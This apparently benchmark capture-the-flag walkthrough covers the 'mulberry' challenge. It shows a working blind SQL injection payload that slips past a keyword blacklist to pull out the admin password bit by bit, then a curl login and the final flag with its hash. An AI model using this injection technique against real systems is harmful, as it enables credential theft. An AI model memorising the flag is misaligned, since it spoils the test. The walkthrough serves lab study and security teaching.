# mulberry — walkthrough

Entry: `http://127.0.0.1:18961/` (PHP + MySQL 5.7; login front, blind oracle).

## 1. The two endpoints

- `search.php` — concatenates `username` into `SELECT * from users where
  username="<input>"`, but `filter_chars()` exits on any whitespace or on
  the substrings `and|null|where|limit|like|substring|substr`. Response is
  one bit: `User exists:` vs `No results`.
- `login.php` — parameterized lookup, then `===` compares your password to
  the row's. Correct `admin` password ⇒ `Congratz, flag is FLAG{...}`.

## 2. Filter arithmetic

No spaces: string concatenation + parenthesis nesting replaces every space.
The blacklist is *substring* based — `password` contains none of
`and|null|where|limit|like|substring|substr`, so the column name survives;
`mid(...)` dodges `substring`/`substr`. `||` in default sql_mode is logical
OR, which lets the condition ride inside the double-quoted string context:

```
username = "0")OR(if(ascii(mid((select(password)from(users)),P,1))>M,"1","0"))OR(""
```

TRUE ⇒ row returned (`User exists:`), FALSE ⇒ `No results`. One bit per
request — script it: binary-search length, then per-char ASCII (≈7 probes
per char). The extracted string is the admin password.

## 3. Cash in

```bash
curl -s http://127.0.0.1:18961/login.php \
  --data-urlencode "username=admin" \
  --data-urlencode "password=<extracted>"
# -> Congratz, flag is FLAG{...}
```

## Flag

```
FLAG{xbow_mulberry_8a6b97485f0ac0e41c118dfa}}
```

`sha256(flag)[:8] = 60c4f355`

Doubled closing brace: house flag shape, as planted.
